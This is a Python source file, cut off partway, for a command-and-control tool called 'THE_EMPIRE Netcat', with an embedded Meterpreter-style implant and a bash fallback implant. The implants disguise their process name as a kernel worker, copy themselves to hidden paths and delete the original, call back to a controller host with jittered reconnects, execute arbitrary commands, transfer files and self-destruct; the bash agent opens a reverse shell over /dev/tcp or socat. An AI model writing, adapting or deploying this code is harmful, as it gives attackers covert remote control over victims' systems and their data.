#!/usr/bin/env python3
"""THE_EMPIRE Netcat: bidirectional RAW TCP over TLS 1.3, manager, and
unauthenticated THE_EMPIRE agent. All transport (sessions, agent callback,
file transfer, HTTP stager delivery) is encrypted with TLS 1.3.

Authentication is DISABLED. Run only on trusted networks (VPN/SSH).

Agent capabilities:
  - TLS 1.3 everywhere (Python ssl; bash fallback requires socat)
  - auto-reconnect with exponential backoff + jitter
  - self-relocation + self-delete
  - command tree-kill on timeout (DoS mitigation)
  - dual-OS aliases (Linux / Windows)
  - Tab completion of remote paths
"""
import argparse
import secrets
import selectors
import signal
import hashlib
from datetime import datetime, timezone
import json
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import atexit
import shutil
import textwrap
import threading
import time
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
BUFFER_SIZE = 65536
MAX_FRAME = 16 * 1024 * 1024
MAX_TRANSFER = 256 * 1024 * 1024
COMMAND_TIMEOUT = 60
UPGRADE_TIMEOUT = 90

# ============================================================
# TLS 1.3 SUPPORT
# ============================================================
_TLS_CERT_DIR = None
_TLS_SERVER_CERT = None
_TLS_SERVER_KEY = None


def _get_cert_dir():
    global _TLS_CERT_DIR
    if _TLS_CERT_DIR is None:
        _TLS_CERT_DIR = tempfile.mkdtemp(prefix="the_empire_tls_")
        atexit.register(lambda: shutil.rmtree(_TLS_CERT_DIR, ignore_errors=True))
    return _TLS_CERT_DIR


def _find_openssl():
    """Locate the openssl binary across platforms."""
    found = shutil.which("openssl")
    if found:
        return found
    if os.name == "nt":
        candidates = [
            r"C:\Program Files\Git\usr\bin\openssl.exe",
            r"C:\Program Files\Git\mingw64\bin\openssl.exe",
            r"C:\Program Files (x86)\Git\usr\bin\openssl.exe",
            r"C:\Program Files\OpenSSL-Win64\bin\openssl.exe",
            r"C:\Program Files\OpenSSL-Win32\bin\openssl.exe",
            r"C:\OpenSSL-Win64\bin\openssl.exe",
            r"C:\OpenSSL-Win32\bin\openssl.exe",
        ]
        for candidate in candidates:
            if os.path.isfile(candidate):
                return candidate
    return None


def _generate_cert_via_cryptography(cert_path, key_path):
    """Generate a self-signed cert + key using the `cryptography` package."""
    import ipaddress
    from datetime import datetime as _dt, timedelta, timezone as _tz

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "the-empire.local"),
    ])
    now = _dt.now(_tz.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName("the-empire.local"),
                x509.DNSName("localhost"),
                x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
            ]),
            critical=False,
        )
        .add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True,
        )
        .sign(private_key, hashes.SHA256())
    )

    with open(key_path, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
    try:
        os.chmod(key_path, 0o600)
    except OSError:
        pass

    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))


def _ensure_server_cert():
    """Generate a self-signed RSA cert + key for the server TLS context.

    Tries, in order:
      1. The `cryptography` package (pure Python, no external binary needed)
      2. The `openssl` CLI (found via PATH or common Windows install paths)
    """
    global _TLS_SERVER_CERT, _TLS_SERVER_KEY
    if _TLS_SERVER_CERT and os.path.exists(_TLS_SERVER_CERT):
        return _TLS_SERVER_CERT, _TLS_SERVER_KEY

    d = _get_cert_dir()
    cert = os.path.join(d, "server.crt")
    key = os.path.join(d, "server.key")

    # --- Method 1: cryptography library (preferred, no external binary) ---
    try:
        _generate_cert_via_cryptography(cert, key)
        _TLS_SERVER_CERT = cert
        _TLS_SERVER_KEY = key
        print("[+] TLS certificate generated via 'cryptography' library",
              file=sys.stderr, flush=True)
        return cert, key
    except ImportError:
        pass
    except Exception as exc:
        print(f"[!] cryptography cert generation failed: {exc}",
              file=sys.stderr, flush=True)

    # --- Method 2: openssl CLI ---
    openssl = _find_openssl()
    if openssl:
        try:
            subprocess.run(
                [openssl, "req", "-x509", "-newkey", "rsa:4096", "-nodes",
                 "-keyout", key, "-out", cert, "-days", "365",
                 "-subj", "/CN=the-empire.local"],
                check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                os.chmod(key, 0o600)
            except OSError:
                pass
            _TLS_SERVER_CERT = cert
            _TLS_SERVER_KEY = key
            print(f"[+] TLS certificate generated via openssl: {openssl}",
                  file=sys.stderr, flush=True)
            return cert, key
        except (subprocess.CalledProcessError, OSError) as exc:
            raise RuntimeError(f"openssl cert generation failed: {exc}")

    # --- All methods failed ---
    raise RuntimeError(
        "TLS certificate generation failed.\n"
        "Fix by either:\n"
        "  1) pip install cryptography   (recommended — no external binary)\n"
        "  2) Install OpenSSL and add it to PATH\n"
        "     Windows: https://slproweb.com/products/Win32OpenSSL.html\n"
        "     Or install Git for Windows (ships openssl):\n"
        "       https://git-scm.com/download/win\n"
        "  3) Run with --no-tls (NOT recommended — traffic will be plaintext)"
    )


def create_server_ssl_context():
    cert, key = _ensure_server_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.load_cert_chain(cert, key)
    return ctx


def create_client_ssl_context():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ============================================================
# METERPRETER-STYLE AGENT (TLS 1.3)
# ============================================================
AGENT_TEMPLATE = '''\
import socket, struct, hashlib, os, json, subprocess, sys, time
import random, signal
try:
    sys.stdout.reconfigure(errors="replace")
except Exception:
    pass
try:
    import ssl as _ssl
except Exception:
    _ssl = None

BUFFER = 65536
LHOST = "__LHOST__"
LPORT = __LPORT__
USE_TLS = __USE_TLS__
CMD_TIMEOUT   = 20
IDLE_PING     = 30
RECONNECT_BASE = 3
RECONNECT_MAX  = 90
JITTER         = 6

def _hide_process_name():
    try:
        if os.name == "nt":
            import ctypes
            k32 = ctypes.WinDLL("kernel32")
            k32.SetConsoleTitleW("[kworker/0:1]")
        else:
            import ctypes
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            libc.prctl(15, b"[kworker/0:1]", 0, 0, 0)
    except Exception:
        pass

_ORIGINAL_PATH = os.path.abspath(__file__)
_HIDDEN_PATH = None
try:
    with open(_ORIGINAL_PATH, "rb") as _f:
        _SELF_BYTES = _f.read()
except Exception:
    _SELF_BYTES = None

def _relocate_self():
    global _HIDDEN_PATH
    if _SELF_BYTES is None:
        return
    candidates = []
    try:
        home = os.path.expanduser("~")
        if home and os.path.isdir(home):
            candidates.append(os.path.join(home, ".cache"))
    except Exception:
        pass
    candidates.append("/tmp")
    candidates.append("/var/tmp")
    stem = ".systemd-private-" + hashlib.md5(
        _ORIGINAL_PATH.encode()).hexdigest()[:10] + ".py"
    for d in candidates:
        try:
            if not os.path.isdir(d):
                os.makedirs(d, exist_ok=True)
            target = os.path.join(d, stem)
            with open(target, "wb") as f:
                f.write(_SELF_BYTES)
            try:
                os.chmod(target, 0o600)
            except Exception:
                pass
            _HIDDEN_PATH = target
            break
        except Exception:
            continue
    try:
        os.unlink(_ORIGINAL_PATH)
    except Exception:
        pass

def resolve_path(current_dir, path):
    path = os.path.expandvars(os.path.expanduser(path.strip('"')))
    return os.path.abspath(os.path.join(current_dir, path))

def file_matches(prefix, current_dir, only_directories=False):
    typed = prefix.strip('"')
    expanded = os.path.expandvars(os.path.expanduser(typed))
    if not expanded:
        directory = current_dir
        stem = ""
    else:
        full_path = os.path.abspath(os.path.join(current_dir, expanded))
        if expanded.endswith(("/", "\\\\")):
            directory = full_path
            stem = ""
        else:
            directory = os.path.dirname(full_path)
            stem = os.path.basename(full_path)
    results = []
    try:
        entries = sorted(os.scandir(directory), key=lambda i: i.name.lower())
        for entry in entries:
            if not entry.name.lower().startswith(stem.lower()):
                continue
            is_dir = entry.is_dir()
            if only_directories and not is_dir:
                continue
            parent = os.path.dirname(typed)
            candidate = os.path.join(parent, entry.name) if parent else entry.name
            if is_dir:
                candidate += os.sep
            results.append({"value": candidate, "directory": is_dir})
            if len(results) >= 100:
                break
    except OSError:
        pass
    return results

def _exec_tree(command, cwd, timeout):
    kwargs = dict(shell=True, cwd=cwd,
                  stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if os.name == "nt":
        kwargs["creationflags"] = 0x00000200
    else:
        kwargs["preexec_fn"] = os.setsid
    try:
        proc = subprocess.Popen(command, **kwargs)
    except Exception as e:
        return ("[!] spawn failed: %s\\n" % e).encode()
    try:
        out, _ = proc.communicate(timeout=timeout)
        return out
    except subprocess.TimeoutExpired:
        if os.name == "nt":
            try: proc.kill()
            except Exception: pass
        else:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                try: proc.kill()
                except Exception: pass
        try: proc.communicate(timeout=2)
        except Exception: pass
        return b"[!] Command timed out and was killed\\n"

def execute(command, cwd=None, timeout=CMD_TIMEOUT):
    command = command.strip()
    if not command:
        return ""
    raw = _exec_tree(command, cwd, timeout)
    encoding = "oem" if os.name == "nt" else "utf-8"
    truncated = len(raw) > 4 * 1024 * 1024
    if truncated:
        raw = raw[:4 * 1024 * 1024]
    output = raw.decode(encoding, errors="replace")
    if truncated:
        output += "\\n[!] Output truncated\\n"
    return output

def process_command(command, current_dir):
    command = command.strip()
    lower = command.lower()
    if not command:
        return "", current_dir
    if lower in ("getpid", "pid"):
        return "%d\\n" % os.getpid(), current_dir
    if lower in ("pwd", "cd"):
        return current_dir + "\\n", current_dir
    if lower == "cd.." or lower.startswith("cd "):
        path = ".." if lower == "cd.." else command[3:].strip()
        if path.lower().startswith("/d "):
            path = path[3:].strip()
        new_dir = resolve_path(current_dir, path)
        if os.path.isdir(new_dir):
            return new_dir + "\\n", new_dir
        return "[!] Directory not found: %s\\n" % new_dir, current_dir

    parts = command.split(maxsplit=1)
    cmd_name = parts[0].lower()
    arguments = " " + parts[1] if len(parts) > 1 else ""

    if os.name == "nt":
        simple = {
            "ls": "dir", "cat": "type", "ifconfig": "ipconfig",
            "ip": "ipconfig", "ps": "tasklist", "top": "tasklist",
            "kill": "taskkill /F /IM", "whoami": "whoami",
            "netstat": "netstat -ano", "share": "net share",
        }
        info = {
            "sys": "systeminfo", "sysinfo": "systeminfo",
            "system": "systeminfo", "getuid": "whoami /user",
            "getprivs": "whoami /priv",
        }
    else:
        simple = {
            "ls": "ls -lah", "cat": "cat", "ifconfig": "ip a",
            "ip": "ip a", "ps": "ps aux",
            "top": "ps aux --sort=-%cpu | head -20",
            "kill": "kill -9", "whoami": "whoami",
            "netstat": "ss -tunap",
            "share": "mount | grep -E 'nfs|cifs|smb'",
        }
        info = {
            "sys": "uname -a; echo; cat /etc/os-release 2>/dev/null",
            "sysinfo": "uname -a; echo; cat /etc/os-release 2>/dev/null",
            "system": "uname -a; echo; cat /etc/os-release 2>/dev/null",
            "getuid": "id",
            "getprivs": "id; echo '---'; sudo -n -l 2>/dev/null || echo 'no sudo info'",
        }

    if cmd_name == "cat" and not arguments:
        return "Usage: cat <filename>\\n", current_dir
    if cmd_name in info and not arguments:
        command = info[cmd_name]
    elif cmd_name in simple:
        command = simple[cmd_name] + arguments

    return execute(command, current_dir), current_dir

def recv_exact(s, n):
    b = bytearray()
    while len(b) < n:
        d = s.recv(n - len(b))
        if not d:
            raise ConnectionError("closed")
        b.extend(d)
    return bytes(b)

def send_frame(s, d):
    if isinstance(d, str):
        d = d.encode("utf-8", "replace")
    s.sendall(struct.pack("!I", len(d)) + d)

def recv_frame(s):
    n = struct.unpack("!I", recv_exact(s, 4))[0]
    return recv_exact(s, n)

def send_packet(s, p):
    send_frame(s, json.dumps(p, ensure_ascii=False))

def recv_packet(s):
    return json.loads(recv_frame(s).decode("utf-8", "replace"))

def session_loop(s):
    current_dir = os.getcwd()
    while True:
        s.settimeout(IDLE_PING)
        try:
            req = recv_packet(s)
        except socket.timeout:
            try:
                send_packet(s, {"op": "ping"})
            except Exception:
                return
            continue
        except Exception:
            return
        op = req.get("op")
        if op == "ping":
            send_packet(s, {"ok": True, "pong": True})
        elif op == "command":
            cmd = req.get("command", "").strip()
            if cmd.lower() in ("exit", "quit"):
                send_packet(s, {"ok": True, "output": "[*] closing\\n"})
                return
            out, current_dir = process_command(cmd, current_dir)
            send_packet(s, {"ok": True, "output": out})
        elif op == "complete":
            matches = file_matches(
                req.get("prefix", ""), current_dir,
                only_directories=req.get("dirs_only", False))
            send_packet(s, {"ok": True, "matches": matches})
        elif op == "download":
            p = req.get("path", "")
            full = resolve_path(current_dir, p)
            if not os.path.isfile(full):
                send_packet(s, {"ok": False, "error": "not found"})
                continue
            try:
                data = open(full, "rb").read()
                send_packet(s, {"ok": True,
                                "name": os.path.basename(full),
                                "size": len(data)})
                if recv_packet(s).get("ready"):
                    s.sendall(data)
                    send_packet(s, {"ok": True,
                                    "sha256": hashlib.sha256(data).hexdigest()})
            except Exception as e:
                send_packet(s, {"ok": False, "error": str(e)})
        elif op == "upload":
            name = req.get("name", "")
            size = req.get("size", 0)
            if not name or "/" in name or "\\\\" in name or ":" in name:
                send_packet(s, {"ok": False, "error": "bad name"})
                continue
            dest = os.path.join(current_dir, name)
            if os.path.exists(dest):
                send_packet(s, {"ok": False, "error": "exists"})
                continue
            try:
                send_packet(s, {"ok": True})
                rem = size
                buf = bytearray()
                while rem > 0:
                    c = recv_exact(s, min(BUFFER, rem))
                    buf.extend(c)
                    rem -= len(c)
                open(dest, "wb").write(bytes(buf))
                send_packet(s, {"ok": True, "saved": dest,
                                "sha256": hashlib.sha256(bytes(buf)).hexdigest()})
            except Exception as e:
                send_packet(s, {"ok": False, "error": str(e)})
        elif op == "selfdestruct":
            send_packet(s, {"ok": True, "output": "[*] good bye\\n"})
            time.sleep(0.3)
            for p in (_HIDDEN_PATH, _ORIGINAL_PATH):
                if p:
                    try: os.unlink(p)
                    except Exception: pass
            os._exit(0)
        else:
            send_packet(s, {"ok": False, "error": "unknown op"})

def _wrap_tls(s):
    if not USE_TLS or _ssl is None:
        return s
    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = _ssl.TLSVersion.TLSv1_3
    ctx.maximum_version = _ssl.TLSVersion.TLSv1_3
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    return ctx.wrap_socket(s, server_hostname=LHOST)

def main():
    _hide_process_name()
    _relocate_self()
    delay = RECONNECT_BASE
    while True:
        s = None
        try:
            s = socket.create_connection((LHOST, LPORT), timeout=30)
            s = _wrap_tls(s)
            if recv_frame(s) != b"THE_EMPIRE-AUTH-V1":
                raise ConnectionError("bad banner")
            recv_frame(s)
            send_frame(s, b"")
            if recv_frame(s) != b"OK":
                raise ConnectionError("rejected")
            _ = recv_frame(s)
            delay = RECONNECT_BASE
            session_loop(s)
        except Exception:
            pass
        if s is not None:
            try: s.close()
            except Exception: pass
        time.sleep(delay + random.randint(0, JITTER))
        delay = min(delay * 2, RECONNECT_MAX)

main()
'''

# ============================================================
# BASH FALLBACK AGENT (requires socat when TLS is enabled)
# ============================================================
BASH_AGENT_TEMPLATE = '''#!/bin/bash
LHOST="__LHOST__"
LPORT=__LPORT__
USE_TLS=__USE_TLS__

if [ "$USE_TLS" = "True" ]; then
  if ! command -v socat >/dev/null 2>&1; then
    echo "[!] socat required for TLS bash agent" >&2
    exit 1
  fi
fi

while true; do
  if [ "$USE_TLS" = "True" ]; then
    FIFO_IN="/tmp/.THE_EMPIREi_$$"
    FIFO_OUT="/tmp/.THE_EMPIREo_$$"
    rm -f "$FIFO_IN" "$FIFO_OUT" 2>/dev/null
    mkfifo -m 600 "$FIFO_IN" "$FIFO_OUT" 2>/dev/null || { sleep 5; continue; }
    exec 3<>"$FIFO_IN"
    exec 4<>"$FIFO_OUT"
    socat - OPENSSL:"$LHOST":"$LPORT",verify=0,method=TLS1.3 \
      <"$FIFO_IN" >"$FIFO_OUT" 2>/dev/null &
    SOCAT_PID=$!
    READ_FD=4
  else
    if ! exec 3<>/dev/tcp/$LHOST/$LPORT 2>/dev/null; then
      sleep 5
      continue
    fi
    READ_FD=3
    SOCAT_PID=""
  fi

  read_n() {
    local n=$1
    if [ "$READ_FD" = "4" ]; then
      dd bs=1 count=$n <&4 2>/dev/null
    else
      dd bs=1 count=$n <&3 2>/dev/null
    fi
  }

  while true; do
    hdr=""
    for i in 1 2 3 4; do
      c=$(read_n 1 | od -An -tu1 | tr -d ' ')
      [ -z "$c" ] && break 2
      hdr="$hdr $c"
    done
    set -- $hdr
    len=$(( ($1 << 24) | ($2 << 16) | ($3 << 8) | $4 ))
    [ "$len" -le 0 ] && continue
    body=$(read_n "$len")
    cmd=$(printf '%s' "$body" | sed -n 's/.*"command":"\\([^"]*\\)".*/\\1/p')
    [ -z "$cmd" ] && continue
    out=$(eval "$cmd" 2>&1)
    esc=$(printf '%s' "$out" | sed 's/\\\\/\\\\\\\\/g; s/"/\\\\"/g' | awk 'BEGIN{ORS="\\\\n"} {print}')
    resp=$(printf '{"ok":true,"output":"%s"}' "$esc")
    rlen=${#resp}
    printf "\\\\x$(printf %02x $((rlen>>24 & 255)))\\\\x$(printf %02x $((rlen>>16 & 255)))\\\\x$(printf %02x $((rlen>>8 & 255)))\\\\x$(printf %02x $((rlen & 255)))$resp" >&3
  done

  exec 3<&- 2>/dev/null
  exec 4<&- 2>/dev/null
  if [ -n "$SOCAT_PID" ]; then
    kill "$SOCAT_PID" 2>/dev/null
    wait "$SOCAT_PID" 2>/dev/null
    rm -f "$FIFO_IN" "$FIFO_OUT" 2>/dev/null
  fi
  sleep 5
done
'''

# ============================================================
# TCP PROTOCOL
# ============================================================
def recv_exact(sock, size):
    buffer = bytearray()
    while len(buffer) < size:
        data = sock.recv(size - len(buffer))
        if not data:
            raise ConnectionError("Connection closed while receiving data")
        buffer.extend(data)
    return bytes(buffer)


def send_frame(sock, data):
    if isinstance(data, str):
        data = data.encode("utf-8", errors="replace")
    if len(data) > MAX_FRAME:
        raise ValueError("Message exceeds frame limit")
    header = struct.pack("!I", len(data))
    sock.sendall(header + data)


def recv_frame(sock):
    header = recv_exact(sock, 4)
    size = struct.unpack("!I", header)[0]
    if size > MAX_FRAME:
        raise ValueError("Incoming frame too large")
    return recv_exact(sock, size)


def server_authenticate(sock):
    send_frame(sock, b"THE_EMPIRE-AUTH-V1")
    send_frame(sock, secrets.token_bytes(32))
    try:
        recv_frame(sock)
    except Exception:
        pass
    send_frame(sock, b"OK")
    return True


def client_authenticate(sock):
    greeting = recv_frame(sock)
    if greeting != b"THE_EMPIRE-AUTH-V1":
        raise ConnectionError("Incompatible THE_EMPIRE server")
    recv_frame(sock)
    send_frame(sock, b"")
    if recv_frame(sock) != b"OK":
        raise PermissionError("THE_EMPIRE rejected")


def decode_frame(data):
    return data.decode("utf-8", errors="replace")


def send_packet(sock, packet):
    data = json.dumps(packet, ensure_ascii=False).encode("utf-8")
    send_frame(sock, data)


def recv_packet(sock):
    return json.loads(decode_frame(recv_frame(sock)))


# ============================================================
# LOCAL COMMAND EXECUTION
# ============================================================
def execute(command, cwd=None):
    command = command.strip()
    if not command:
        return ""
    try:
        result = subprocess.run(
            command, shell=True, cwd=cwd,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=COMMAND_TIMEOUT)
        encoding = "oem" if os.name == "nt" else "utf-8"
        raw = result.stdout
        truncated = len(raw) > 4 * 1024 * 1024
        if truncated:
            raw = raw[:4 * 1024 * 1024]
        output = raw.decode(encoding, errors="replace")
        if truncated:
            output += "\n[!] Output truncated\n"
        if result.returncode != 0:
            output += f"\n[Exit code: {result.returncode}]\n"
        return output
    except subprocess.TimeoutExpired:
        return f"[!] Command timed out after {COMMAND_TIMEOUT} seconds\n"
    except Exception as error:
        return f"[!] Command failed: {error}\n"


# ============================================================
# DIRECTORY MANAGEMENT
# ============================================================
def resolve_path(current_dir, path):
    path = os.path.expandvars(os.path.expanduser(path.strip('"')))
    return os.path.abspath(os.path.join(current_dir, path))


def process_command(command, current_dir):
    command = command.strip()
    lower = command.lower()
    if not command:
        return "", current_dir
    if lower in ("getpid", "pid"):
        return f"{os.getpid()}\n", current_dir
    if lower in ("pwd", "cd"):
        return current_dir + "\n", current_dir
    if lower == "cd.." or lower.startswith("cd "):
        path = ".." if lower == "cd.." else command[3:].strip()
        if path.lower().startswith("/d "):
            path = path[3:].strip()
        new_dir = resolve_path(current_dir, path)
        if os.path.isdir(new_dir):
            return new_dir + "\n", new_dir
        return f"[!] Directory not found: {new_dir}\n", current_dir
    if os.name == "nt":
        parts = command.split(maxsplit=1)
        cmd_name = parts[0].lower()
        arguments = " " + parts[1] if len(parts) > 1 else ""
        aliases = {
            "ls": "dir", "cat": "type", "sys": "systeminfo",
            "sysinfo": "systeminfo", "system": "systeminfo",
            "ifconfig": "ipconfig", "ip": "ipconfig",
            "ps": "tasklist", "kill": "taskkill /F /IM",
            "top": "tasklist", "getuid": "whoami /user",
            "whoami": "whoami", "getprivs": "whoami /priv",
            "netstat": "netstat -ano", "share": "net share",
        }
        if cmd_name == "cat" and not arguments:
            return "Usage: cat <filename>\n", current_dir
        command = aliases.get(cmd_name, parts[0]) + arguments
    return execute(command, current_dir), current_dir


# ============================================================
# FILE COMPLETION
# ============================================================
def file_matches(prefix, current_dir, only_directories=False):
    typed = prefix.strip('"')
    expanded = os.path.expandvars(os.path.expanduser(typed))
    if not expanded:
        directory = current_dir
        stem = ""
    else:
        full_path = os.path.abspath(os.path.join(current_dir, expanded))
        if expanded.endswith(("/", "\\")):
            directory = full_path
            stem = ""
        else:
            directory = os.path.dirname(full_path)
            stem = os.path.basename(full_path)
    results = []
    try:
        entries = sorted(os.scandir(directory), key=lambda item: item.name.lower())
        for entry in entries:
            if not entry.name.lower().startswith(stem.lower()):
                continue
            is_directory = entry.is_dir()
            if only_directories and not is_directory:
                continue
            parent = os.path.dirname(typed)
            candidate = os.path.join(parent, entry.name) if parent else entry.name
            if is_directory:
                candidate += os.sep
            results.append({"value": candidate, "directory": is_directory})
            if len(results) >= 100:
                break
    except OSError:
        pass
    return results


def local_file_matches(prefix):
    return file_matches(prefix, os.getcwd())


# ============================================================
# MAIN CLASS
# ============================================================
class NetCat:
    def __init__(self, args):
        self.args = args
        self.sessions = {}
        self.selected_id = None
        self.next_session_id = 1
        self.log_lock = threading.Lock()
        self.sessions_lock = threading.RLock()
        self._raw_detach_requested = False
        self._stop_accepting = threading.Event()
        self._agent_listener = None
        self._agent_port = None

        self.use_tls = not args.no_tls
        self._tls_server_ctx = None
        self._tls_client_ctx = None
        self._tls_lock = threading.Lock()

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # ---------------- TLS helpers ----------------
    def _get_server_ctx(self):
        with self._tls_lock:
            if self._tls_server_ctx is None:
                self._tls_server_ctx = create_server_ssl_context()
        return self._tls_server_ctx

    def _get_client_ctx(self):
        with self._tls_lock:
            if self._tls_client_ctx is None:
                self._tls_client_ctx = create_client_ssl_context()
        return self._tls_client_ctx

    def _wrap_accepted(self, sock):
        if not self.use_tls:
            return sock
        return self._get_server_ctx().wrap_socket(sock, server_side=True)

    def _wrap_connecting(self, sock, hostname=None):
        if not self.use_tls:
            return sock
        return self._get_client_ctx().wrap_socket(
            sock, server_hostname=hostname or "the-empire.local")

    def log_event(self, event, **details):
        if not self.args.log:
            return
        entry = {"time": datetime.now(timezone.utc).isoformat(),
                 "event": event, **details}
        try:
            with self.log_lock:
                with open(self.args.log, "a", encoding="utf-8") as stream:
                    stream.write(json.dumps(entry, ensure_ascii=False) + "\n")
        except OSError as error:
            print(f"[!] Unable to write log: {error}", file=sys.stderr)

    def run(self):
        if self.args.raw:
            try:
                if self.args.listen:
                    if self.args.raw_echo:
                        self.raw_listen()
                    else:
                        self.raw_manager_listen()
                else:
                    self.raw_send()
            finally:
                if self.socket is not None:
                    try:
                        self.socket.close()
                    except OSError:
                        pass
            return
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # ---------------- RAW ----------------
    def raw_stream(self, peer):
        print("[*] Full-duplex RAW TCP active (Ctrl+C to leave)",
              file=sys.stderr, flush=True)
        if os.name == "nt":
            return self._raw_windows_attach(peer)

        stop = threading.Event()

        def stdin_to_peer():
            try:
                while not stop.is_set():
                    data = os.read(sys.stdin.fileno(), BUFFER_SIZE)
                    if not data:
                        break
                    peer.sendall(data)
            except (OSError, ConnectionError):
                pass
            finally:
                stop.set()
                try:
                    peer.shutdown(socket.SHUT_WR)
                except (OSError, ConnectionError):
                    pass

        def peer_to_stdout():
            try:
                while not stop.is_set():
                    data = peer.recv(BUFFER_SIZE)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
            except (OSError, ConnectionError):
                pass
            finally:
                stop.set()

        t1 = threading.Thread(target=stdin_to_peer, daemon=True)
        t2 = threading.Thread(target=peer_to_stdout, daemon=True)
        t1.start(); t2.start()

        try:
            while t1.is_alive() or t2.is_alive():
                if self._raw_detach_requested:
                    break
                t1.join(timeout=0.2)
                t2.join(timeout=0.2)
        except KeyboardInterrupt:
            pass
        stop.set()
        if self._raw_detach_requested:
            return "background"
        return "closed"

    def _raw_windows_attach(self, peer):
        import msvcrt
        import select
        line = []
        while True:
            if self._raw_detach_requested:
                return "background"
            has_pending = isinstance(peer, ssl.SSLSocket) and peer.pending() > 0
            if has_pending:
                chunk = peer.recv(BUFFER_SIZE)
                if not chunk:
                    return "closed"
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()
            else:
                readable, _, _ = select.select([peer], [], [], 0.1)
                if readable:
                    chunk = peer.recv(BUFFER_SIZE)
                    if not chunk:
                        return "closed"
                    sys.stdout.buffer.write(chunk)
                    sys.stdout.buffer.flush()
            if msvcrt.kbhit():
                char = msvcrt.getwch()
                if char == "\x03":
                    return "background"
                if char == "\x1a":
                    print("\n", flush=True)
                    return "background"
                if char in ("\x00", "\xe0"):
                    msvcrt.getwch()
                    continue
                if char == "\b":
                    if line:
                        line.pop()
                        sys.stdout.write("\b \b")
                        sys.stdout.flush()
                    continue
                if char == "\r":
                    data = "".join(line).encode("utf-8") + b"\n"
                    line.clear()
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    peer.sendall(data)
                    continue
                line.append(char)
                sys.stdout.write(char)
                sys.stdout.flush()

    def raw_receive(self, peer, echo=False):
        while True:
            try:
                chunk = peer.recv(BUFFER_SIZE)
            except (OSError, ConnectionError):
                return
            if not chunk:
                return
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
            if echo:
                try:
                    peer.sendall(chunk)
                except (OSError, ConnectionError):
                    return

    def raw_listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        mode = "TLS 1.3 " if self.use_tls else ""
        print(f"[+] RAW {mode}TCP listener: {self.args.target}:{self.args.port}",
              flush=True)
        try:
            while True:
                client, address = self.socket.accept()
                if self.use_tls:
                    try:
                        client = self._wrap_accepted(client)
                    except (ssl.SSLError, OSError) as exc:
                        print(f"[!] TLS handshake failed from "
                              f"{address[0]}:{address[1]}: {exc}",
                              file=sys.stderr, flush=True)
                        try: client.close()
                        except OSError: pass
                        continue
                print(f"[+] RAW connection from {address[0]}:{address[1]}",
                      flush=True, file=sys.stderr)
                self.log_event("raw_incoming", host=address[0], port=address[1])
                with client:
                    try:
                        if self.args.raw_echo:
                            self.raw_receive(client, echo=True)
                        else:
                            self.raw_stream(client)
                    except (ConnectionError, OSError) as exc:
                        print(f"[!] RAW session closed: {exc}",
                              file=sys.stderr, flush=True)
        except KeyboardInterrupt:
            print("\n[*] RAW listener stopped", file=sys.stderr)

    def raw_send(self):
        self.socket.settimeout(15)
        self.socket.connect((self.args.target, self.args.port))
        self.socket = self._wrap_connecting(self.socket,
                                            hostname=self.args.target)
        self.socket.settimeout(None)
        self.log_event("raw_connected", host=self.args.target, port=self.args.port)
        proto = "TLS 1.3" if self.use_tls else "RAW"
        print(f"[+] {proto} TCP connected: {self.args.target}:{self.args.port}",
              file=sys.stderr, flush=True)
        if self.args.raw_message is not None:
            self.socket.sendall(self.args.raw_message.encode("utf-8"))
            self.socket.shutdown(socket.SHUT_WR)
            self.raw_receive(self.socket)
        else:
            self.raw_stream(self.socket)

    # ---------------- SESSION MANAGER ----------------
    def _raw_accept_loop(self, listener):
        while not self._stop_accepting.is_set():
            try:
                peer, address = listener.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            if self.use_tls:
                try:
                    peer = self._wrap_accepted(peer)
                except (ssl.SSLError, OSError) as exc:
                    print(f"[!] TLS handshake failed from "
                          f"{address[0]}:{address[1]}: {exc}",
                          file=sys.stderr, flush=True)
                    try: peer.close()
                    except OSError: pass
                    continue
            peer.settimeout(None)
            with self.sessions_lock:
                identifier = self.next_session_id
                self.next_session_id += 1
                self.sessions[identifier] = {
